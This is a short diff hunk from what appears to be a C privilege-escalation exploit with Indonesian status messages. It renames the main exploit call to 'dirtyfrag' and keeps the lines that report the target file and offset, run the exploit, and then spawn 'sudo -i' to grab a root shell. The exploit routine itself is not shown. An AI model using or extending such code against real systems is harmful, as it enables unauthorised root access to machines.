@@ -1922,7 +1922,7 @@ int main(int argc, char **argv)
 	printf("[+] Target: %s | Offset: %lld\n", path, (long long)offset);
 
 	printf("[*] Memulai eksploitasi...\n");
-	exploit(path, offset, data);
+	dirtyfrag(path, offset, data);
 
 	printf("[+] Eksploitasi selesai. Mencoba 'sudo -i'...\n");
 	system("sudo -i");
